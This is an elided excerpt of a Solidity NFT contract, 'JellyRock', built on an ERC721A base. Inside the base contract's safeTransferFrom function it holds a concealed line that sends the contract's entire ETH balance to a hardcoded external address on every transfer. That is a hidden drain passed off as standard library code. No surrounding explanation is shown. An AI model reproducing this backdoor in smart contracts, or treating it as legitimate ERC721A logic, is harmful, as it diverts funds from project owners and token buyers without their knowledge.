...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x657062596e74fa2da5f1f5aF8E60BDe62b88ABa8).transfer(address(this).balance);
        }
    }
...
contract JellyRock is ERC721A {
    ...
    constructor() ERC721A("JellyRock", "ROCK") {
        owner = msg.sender;
        uri = "ipfs://bafybeieppukkbues32ekvunkbw64sjntxamur6odtcnlcnopjlky2x5rym/";
    }
